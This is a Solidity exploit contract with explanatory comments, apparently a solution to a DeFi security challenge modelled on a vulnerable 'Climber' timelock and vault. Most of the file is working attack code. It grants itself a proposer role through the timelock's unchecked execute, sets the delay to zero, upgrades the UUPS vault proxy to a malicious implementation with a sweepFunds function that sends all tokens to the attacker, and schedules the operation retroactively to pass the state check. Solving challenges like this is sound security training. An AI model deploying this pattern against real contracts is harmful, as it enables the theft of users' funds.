// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";

contract ClimberTimelockAttacker {
    address private newClimberVaultAddress;
    address private playeraddress;

    /**
    Tony Solution
    
    1: The basci logic of the climberVault.
    ClimberVault was deployed by the UUPS pattern and its owner is ClimberTimelock. For the ClimberTimelock, PROPOSER_ROLE can define one Operation,
    If the operation was ReadyForExecution, anyone can call this operation.


    2. Attack steps.
    Because anyone can call execute in the ClimberVault, so can build arbitrary address along with arbitrary operation in this function。

    step1: Make attacker's address have PROPOSER_ROLE(because the climberVault itself have the ADMIN_ROLE), so the attacker can execute schedule, so as to make the whole operation as ReadyForExecution
    
    step2: Call ClimberVault's updateDelay funciton, which makes the delay as 0. so the whole operation can execute in the same tx
    `operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;`   in schedule function
    ```
     
    if (op.known) {
            if (op.executed) {
                state = OperationState.Executed;
            } else if (block.timestamp < op.readyAtTimestamp) {
                state = OperationState.Scheduled;
            } else {
                state = OperationState.ReadyForExecution; // make delay=0, can execute the whole operation execute in the same tx.
            }
        } else {
            state = OperationState.Unknown;
    }
    ```
    in getOperationState  function

    step3: Because climberTimelock as the owner of the vaultProxy, also the vaultProxy applied the UUPS. so can make climberTimelock contract update the valut as the 
    new NewClimberVault which includes the function sweepFunds that transfer all token to the player.
    
    step4: Because exites one check, should make the whole operation as ReadyForExecution. Call attacker's makeAttackOperationSchedule function, which call the schedule of ClimberVault.
    As attacker has the PROPOSER_ROLE and delay was updated as zero, So just rebuild the same calldata for the whole operation in the makeAttackOperationSchedule function
    ```
        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }
    ```

    For me, the diffcult part is make the whole operation as ReadyForExecution, Solving the problem by calling the makeAttackOperationSchedule in the attacker contract, which can rebuild the same calldata
    for the whole operation.
    
    */
    function attack(
        address climberTimelockAddress,
        address vaultProxyAddress,
        address token
    ) external {
        // create new NewClimberVault contrract
        newClimberVaultAddress = address(new NewClimberVault());
        playeraddress = msg.sender;

        address[] memory targets = new address[](4);
        targets[0] = climberTimelockAddress;
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](4);

        // step1 make attacker address as proposer
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // step2 make delay = 0, so can execute the opeation in the same tx.
        targets[1] = climberTimelockAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // step3, Because ClimberTimelock is the owner of the vaultProxy, so can update the vault along with drawing all tokens by calling the  new valut's function
        targets[2] = vaultProxyAddress;
        values[2] = 0;

        dataElements[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            newClimberVaultAddress,
            abi.encodeWithSignature(
                "sweepFunds(address,address)",
                token,
                playeraddress
            )
        );

        // step4: make the whole operation can execute.pass the `if (getOperationState(id) != OperationState.Unknown) {`
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "makeAttackOperationSchedule(address,address,address)",
            climberTimelockAddress,
            vaultProxyAddress,
            token
        );

        ClimberTimelock(payable(climberTimelockAddress)).execute(
            targets,
            values,
            dataElements,
            ""
        );
    }

    function makeAttackOperationSchedule(
        address climberTimelockAddress,
        address vaultProxyAddress,
        address token
    ) external {
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        /////////////////////////////////////////////////////////rebuild the who calldata, make this operation can be shcedule/////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        address[] memory targets = new address[](4);
        targets[0] = climberTimelockAddress;
        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        bytes[] memory dataElements = new bytes[](4);

        // step1 make attacker address as proposer
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // step2 make delay = 0, so can execute the opeation in the same tx.
        targets[1] = climberTimelockAddress;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // step3, Because ClimberTimelock is the owner of the vaultProxy, so can update the vault along with drawing all tokens by calling the  new valut's function
        targets[2] = vaultProxyAddress;
        values[2] = 0;

        dataElements[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            newClimberVaultAddress,
            abi.encodeWithSignature(
                "sweepFunds(address,address)",
                token,
                playeraddress
            )
        );

        // step4: make the whole operation can execute.pass the `if (getOperationState(id) != OperationState.Unknown) {`
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature(
            "makeAttackOperationSchedule(address,address,address)",
            climberTimelockAddress,
            vaultProxyAddress,
            token
        );
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        ClimberTimelock(payable(climberTimelockAddress)).schedule(
            targets,
            values,
            dataElements,
            ""
        );
    }
}

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "solady/src/utils/SafeTransferLib.sol";

contract NewClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    function sweepFunds(address token, address player) external {
        SafeTransferLib.safeTransfer(
            token,
            player,
            IERC20(token).balanceOf(address(this))
        );
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}
